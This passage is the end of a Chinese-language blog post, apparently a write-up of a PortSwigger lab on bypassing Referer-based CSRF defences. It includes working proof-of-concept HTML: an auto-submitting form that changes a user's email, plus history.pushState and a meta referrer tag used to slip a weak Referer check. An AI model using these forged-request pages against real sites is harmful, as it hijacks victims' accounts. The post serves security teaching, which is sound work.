<p>If the Origin header is not present, verify that the hostname in the Referer header matches the target origin. This method of CSRF mitigation is also commonly used with unauthenticated requests, such as requests made prior to establishing a session state, which is required to keep track of a synchronization token.</p>
<p>In both cases, make sure the target origin check is strong. For example, if your site is <code>example.org</code> make sure <code>example.org.attacker.com</code> does not pass your origin check (i.e, match through the trailing &#x2F; after the origin to make sure you are matching against the entire origin).</p>
</blockquote>
<p>如果不是严格的 Host 匹配，可能会被绕过，存在如下情形：</p>
<ul>
<li>仅匹配前缀，可以通过子域名来绕过</li>
<li>仅匹配包含，可以通过 URL 参数来绕过</li>
</ul>
<p>对于 URL 参数，可以借助 <code>history.pushState</code> 来实现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a96008804e043d38242153b000e00af.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2@normal-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;/?0a96008804e043d38242153b000e00af.web-security-academy.net&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但测试发现，URL 中的参数没有生效：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/my-account/change-email</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a96008804e043d38242153b000e00af.web-security-academy.net</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://exploit-0a6b003204e1437d82e0140201c70075.exploit-server.net/</span><br></pre></td></tr></table></figure>

<p>需要设置 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy">Referrer-Policy header</a>，可直接通过 <code>&lt;meta&gt;</code> 标签设置（注意名称是 <code>referrer</code>，多了一个 <code>r</code>）：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;unsafe-url&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a96008804e043d38242153b000e00af.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2@normal-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;/?0a96008804e043d38242153b000e00af.web-security-academy.net&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h2><ul>
<li>SameSite 策略（Strict、Lax、None）</li>
<li>浏览器对 <code>window.open</code> 的拦截和绕过机制</li>
<li>浏览器不允许代码修改或自定义 <code>Referer</code>，但是可以让 <code>Referer</code> 为空</li>
<li>基于 <code>Origin</code> 或者 <code>Referer</code> 检查请求来源，以防御 CSRF 攻击<ul>
<li>可能存在的问题及绕过方式</li>
<li>通过 <code>history.pushState</code> 部分修改 <code>Referer</code></li>
<li><code>Referrer-Policy</code> 的设置方式</li>
</ul>
</li>
</ul>
<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf">https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf</a></li>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_request_header">https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_request_header</a></li>
<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy</a></li>
</ol>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Burp/" rel="tag"># Burp</a>
              <a href="/tags/CSRF/" rel="tag"># CSRF</a>
              <a href="/tags/Referer/" rel="tag"># Referer</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/05/28/burp-web-academy-csrf-cross-site-request-forgery-part2/" rel="prev" title="Burp Web Academy CSRF 跨站请求伪造（二）">
                  <i class="fa fa-angle-left"></i> Burp Web Academy CSRF 跨站请求伪造（二）
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/06/08/cloud-computing-concepts-part1/" rel="next" title="云计算相关概念">
                  云计算相关概念 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Livermore</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
